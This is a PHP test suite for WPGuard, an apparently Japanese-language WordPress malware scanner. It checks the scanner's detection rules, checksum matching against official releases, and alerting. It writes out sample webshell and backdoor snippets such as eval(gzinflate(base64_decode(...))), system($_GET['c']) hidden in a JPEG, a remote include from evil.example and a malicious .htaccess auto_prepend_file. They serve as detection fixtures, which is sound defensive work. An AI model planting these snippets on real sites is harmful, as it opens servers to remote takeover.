<?php

/*
 * Step 2 tests: malicious code patterns and official checksums.
 * Included from tests/run.php (uses its helpers and $tmp).
 */

declare(strict_types=1);

use WPGuard\App;
use WPGuard\Checksums\ChecksumProvider;
use WPGuard\Config;
use WPGuard\Logger;
use WPGuard\PatternScanner;

/** Serves checksums that the test registers, as wordpress.org would. */
final class FakeChecksums implements ChecksumProvider
{
    /** @var array<string,array<string,string>> */
    public array $core = [];
    /** @var array<string,array<string,string[]>> */
    public array $plugins = [];
    /** @var string[] */
    public array $calls = [];

    public function core(string $version, string $locale): ?array
    {
        $this->calls[] = "core:{$version}:{$locale}";
        return $this->core["{$version}:{$locale}"] ?? null;
    }

    public function plugin(string $slug, string $version): ?array
    {
        $this->calls[] = "plugin:{$slug}:{$version}";
        return $this->plugins["{$slug}:{$version}"] ?? null;
    }

    /** Registers the current contents of the site's core files as an official release. */
    public function publishCore(string $site, string $version, string $locale): void
    {
        $sums = [];
        foreach (['index.php', 'wp-load.php', 'wp-includes/version.php', 'wp-includes/load.php', 'wp-admin/admin.php'] as $f) {
            $sums[$f] = md5_file("{$site}/{$f}");
        }
        $this->core["{$version}:{$locale}"] = $sums;
    }

    public function publishPlugin(string $dir, string $slug, string $version): void
    {
        $sums = [];
        foreach (glob("{$dir}/*") as $file) {
            $sums[basename($file)] = [hash_file('sha256', $file)];
        }
        $this->plugins["{$slug}:{$version}"] = $sums;
    }
}

function pluginHeader(string $name, string $version): string
{
    return "<?php\n/**\n * Plugin Name: {$name}\n * Version: {$version}\n */\n";
}

// ---------------------------------------------------------------- pattern rules
section('検出ルール: 怪しいコードを見つける');
$scanner = PatternScanner::fromFile(dirname(__DIR__) . '/rules/patterns.php', 5 * 1024 * 1024);
$sample = "{$tmp}/sample";
$expect = static function (string $target, string $code, ?string $rule, string $label) use ($scanner, $sample): void {
    file_put_contents($sample, $code);
    $m = $scanner->scan($sample, $target);
    check(($m?->rule) === $rule, $label . ($m !== null && $m->rule !== $rule ? " (実際: {$m->rule})" : ''));
};
$expect('php', '<?php eval(base64_decode("ZWNobyAx"));', 'eval-decode', 'eval(base64_decode(...))');
$expect('php', '<?php @eval(gzinflate(base64_decode($x)));', 'eval-decode', 'eval(gzinflate(base64_decode(...)))');
$expect('php', '<?php @system($_GET["cmd"]);', 'exec-request', 'system($_GET[...])');
$expect('php', '<?php assert(stripslashes($_REQUEST["a"]));', 'exec-request', 'assert(stripslashes($_REQUEST[...]))');
$expect('php', '<?php $_POST["f"]($_POST["a"]);', 'call-request', '$_POST["f"](...)');
$expect('php', '<?php preg_replace("/.*/e", $_POST["x"], "");', 'preg-replace-e', 'preg_replace の /e 修飾子');
$expect('php', '<?php // FilesMan', 'webshell-name', '既知の Web シェル名');
$expect('php', '<?php $s = "' . str_repeat('QUFB', 1000) . '";', 'long-base64', '長い base64 文字列');
$expect('php', '<?php $s = "' . str_repeat('\\x41', 50) . '";', 'hex-escape', '16 進エスケープ');
$expect('php', '<?php $f = ' . str_repeat('chr(101).', 13) . '"";', 'chr-chain', 'chr() の連結');
$expect('php', '<?php include("http://evil.example/x.txt");', 'remote-include', '外部 URL の include');
$expect('php', '<?php $f = "base64_decode"; $c = $f($x);', 'variable-function-decode', '文字列から組み立てた関数呼び出し');
$expect('uploads', "GIF89a\x01\x02<?php echo 1; ?>", 'php-in-media', '画像に偽装した PHP');
$expect('uploads', "\xFF\xD8\xFF<?php system(\$_GET['c']); ?>", 'exec-request', '画像に偽装した Web シェル (より重いルールを優先)');
$expect('htaccess', "php_value auto_prepend_file /tmp/.x.php\n", 'htaccess-prepend', '.htaccess の auto_prepend_file');
$expect('htaccess', "AddHandler application/x-httpd-php .jpg\n", 'htaccess-php-handler', '.jpg を PHP として実行させる設定');
$expect('htaccess', "RewriteEngine On\nRewriteCond %{HTTP_REFERER} google [NC]\nRewriteRule .* https://spam.example/ [R,L]\n", 'htaccess-redirect', '検索エンジンからだけ転送する設定');

section('検出ルール: 普通のコードは誤検知しない');
$expect('php', '<?php $data = base64_decode($response["body"]);', null, 'base64_decode 単体');
$expect('php', '<?php if (isset($_POST["action"])) { do_action(sanitize_key($_POST["action"])); }', null, '$_POST の通常の利用');
$expect('php', '<?php $s = preg_replace("/\s+/", " ", $s); $t = preg_replace("/(\d+)e/i", "", $t);', null, 'preg_replace の通常の利用');
$expect('php', '<?php include ABSPATH . "wp-admin/includes/plugin.php";', null, 'ローカルファイルの include');
$expect('php', '<?php $x = chr(65) . chr(66);', null, '少しだけの chr()');
$expect('php', '<?php function wp_cache_system($a) {} wp_cache_system($_GET);', null, 'system を含む別の関数名');
$expect('php', '<?php eval("?>" . $template);', null, 'テンプレートの eval (復号なし)');
$expect('uploads', "\xFF\xD8\xFF\xE0JFIF normal image data", null, '普通の画像');
$expect('htaccess', "# BEGIN WordPress\nRewriteEngine On\nRewriteRule ^index\\.php$ - [L]\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteRule . /index.php [L]\n# END WordPress\n", null, 'WordPress 標準の .htaccess');

// ---------------------------------------------------------------- site with checksums
$www2 = "{$tmp}/www2";
$C = "{$www2}/site-c";
makeWp($C);
file_put_contents("{$C}/wp-includes/version.php", "<?php\n\$wp_version = '6.8.3';\n\$wp_local_package = 'ja';\n");
file_put_contents("{$C}/wp-content/plugins/hello/hello.php", pluginHeader('Hello', '1.0') . "function hello() {}\n");
file_put_contents("{$C}/wp-content/plugins/hello/readme.txt", "=== Hello ===\n");
mkdir("{$C}/wp-content/plugins/premium");
file_put_contents("{$C}/wp-content/plugins/premium/premium.php", pluginHeader('Premium', '2.0'));

$fake = new FakeChecksums();
$fake->publishCore($C, '6.8.3', 'ja');
$fake->publishPlugin("{$C}/wp-content/plugins/hello", 'hello', '1.0');

// Already compromised before monitoring starts.
file_put_contents("{$C}/wp-content/themes/twenty/functions.php", '<?php @eval(gzinflate(base64_decode("y0gtyslXKM8vyklRBAA=")));');
file_put_contents("{$C}/wp-content/uploads/2026/11/index.php", '<?php // Silence is golden.');
file_put_contents("{$C}/wp-includes/load.php", "<?php // core\n/* injected */ if(isset(\$_COOKIE['k'])){}\n");

$n2 = new CaptureNotifier();
$app2 = new App(
    Config::fromArray(['roots' => [$www2], 'data_dir' => "{$tmp}/data2", 'db_scan' => false, 'log_file' => "{$tmp}/wpguard2.log"]),
    $n2, new Logger("{$tmp}/wpguard2.log"), false, $fake,
);
$t2 = time();

section('導入時点で置かれていたマルウェア');
$r = $app2->scan(false, null, $t2);
$byRule = [];
foreach ($r['site-c']->findings as $x) {
    $byRule[$x->rule] = $x;
}
check(in_array('core:6.8.3:ja', $fake->calls, true), '日本語版 (ja) のチェックサムで照合する');
check(isset($byRule['eval-decode']) && $byRule['eval-decode']->severity->value === 'critical' && $byRule['eval-decode']->kind === 'existing', 'テーマ内のバックドアを🔴緊急で検知');
check(isset($byRule['core-modified']) && $byRule['core-modified']->path === 'wp-includes/load.php', '改ざん済みのコアファイルを🔴緊急で検知');
check(isset($byRule['uploads-php']) && $byRule['uploads-php']->severity->value === 'warning', 'uploads 内の既存 PHP は🟡警告 (確認を促す)');
check(count($r['site-c']->findings) === 3, '正常なファイルは報告しない (合計 3 件)');
$m = $n2->take();
check(count($m) === 2 && str_contains($m[0]->text, '3 件の怪しいファイル') && str_contains($m[1]->text, 'functions.php'), '「監視を開始しました」に続けて、検知内容を通知');
echo "\n" . preg_replace('/^/m', '      | ', $m[1]->text) . "\n";

section('同じものを何度も報告しない');
$app2->scan(false, null, $t2 += 60);
check(count($n2->take()) === 0, '簡易スキャンでは再報告しない');
$r = $app2->scan(true, null, $t2 += 60);
check(count($r['site-c']->findings) === 0 && count($n2->take()) === 0, '全件スキャンでも、記録済みのものは再報告しない');
$app2->db->ackAllFindings(null, $t2);
$r = $app2->scan(true, null, $t2 += 60);
check(count($r['site-c']->findings) === 0, '確認済み (ack) にしたものも再報告しない');

section('WordPress 本体の正規の更新');
file_put_contents("{$C}/wp-includes/version.php", "<?php\n\$wp_version = '6.8.4';\n\$wp_local_package = 'ja';\n");
file_put_contents("{$C}/wp-includes/load.php", "<?php // core 6.8.4\n");
file_put_contents("{$C}/wp-admin/admin.php", "<?php // admin 6.8.4\n");
$fake->publishCore($C, '6.8.4', 'ja');
$r = $app2->scan(false, null, $t2 += 60);
$rules = array_unique(array_map(static fn ($x) => $x->rule, $r['site-c']->findings));
check(count($r['site-c']->findings) === 3 && $rules === ['official'], '公式配布版と一致するので🔵情報 (3 ファイル)');
check(count($n2->take()) === 0, '通知しない');

section('コアファイルの改ざん');
file_put_contents("{$C}/wp-admin/admin.php", "<?php // admin 6.8.4\nif (md5(\$_GET['p']) === 'x') { /* ... */ }\n");
file_put_contents("{$C}/wp-includes/class-wp-session-cache.php", '<?php // looks like core');
$r = $app2->scan(false, null, $t2 += 60);
$byRule = [];
foreach ($r['site-c']->findings as $x) {
    $byRule[$x->rule] = $x;
}
check(isset($byRule['core-modified']) && $byRule['core-modified']->severity->value === 'critical', '公式配布版と違うコアファイルを🔴緊急で検知');
check(isset($byRule['core-extra']) && $byRule['core-extra']->severity->value === 'critical', 'コアディレクトリに紛れ込んだファイルを🔴緊急で検知');
$n2->take();

section('プラグイン');
file_put_contents("{$C}/wp-content/plugins/hello/hello.php", pluginHeader('Hello', '1.1') . "function hello() { return 2; }\n");
$fake->publishPlugin("{$C}/wp-content/plugins/hello", 'hello', '1.1');
$r = $app2->scan(false, null, $t2 += 60);
check(count($r['site-c']->findings) === 1 && $r['site-c']->findings[0]->rule === 'official', '公式リポジトリの版と一致する更新は🔵情報');
check(count($n2->take()) === 0, '通知しない');

file_put_contents("{$C}/wp-content/plugins/hello/hello.php", pluginHeader('Hello', '1.1') . "function hello() { return 3; }\n");
file_put_contents("{$C}/wp-content/plugins/hello/wp-cache-helper.php", '<?php // dropped');
$r = $app2->scan(false, null, $t2 += 60);
$byRule = [];
foreach ($r['site-c']->findings as $x) {
    $byRule[$x->rule] = $x;
}
check(isset($byRule['plugin-modified']) && $byRule['plugin-modified']->severity->value === 'warning', '公式の版と違うプラグインのファイルを🟡警告で検知');
check(isset($byRule['plugin-extra']), 'プラグインに紛れ込んだ PHP ファイルを検知');

file_put_contents("{$C}/wp-content/plugins/premium/premium.php", pluginHeader('Premium', '2.0') . "// updated\n");
$r = $app2->scan(false, null, $t2 += 60);
check(count($r['site-c']->findings) === 1 && $r['site-c']->findings[0]->rule === 'code' && $r['site-c']->findings[0]->severity->value === 'warning', '公式リポジトリにない有料プラグインは、従来どおり🟡警告');
$n2->take();

section('画像に偽装した PHP・.htaccess');
file_put_contents("{$C}/wp-content/uploads/2026/11/cat.jpg", "\xFF\xD8\xFF\xE0<?php system(\$_GET['c']); ?>");
file_put_contents("{$C}/wp-content/uploads/.htaccess", "php_value auto_prepend_file /tmp/x\n");
$r = $app2->scan(false, null, $t2 += 60);
$byRule = [];
foreach ($r['site-c']->findings as $x) {
    $byRule[$x->rule] = $x;
}
check(isset($byRule['exec-request']) && $byRule['exec-request']->path === 'wp-content/uploads/2026/11/cat.jpg' && $byRule['exec-request']->severity->value === 'critical', '.jpg の中の Web シェルを🔴緊急で検知');
check(isset($byRule['htaccess-prepend']) && $byRule['htaccess-prepend']->detail !== null, '.htaccess の auto_prepend_file を検知');
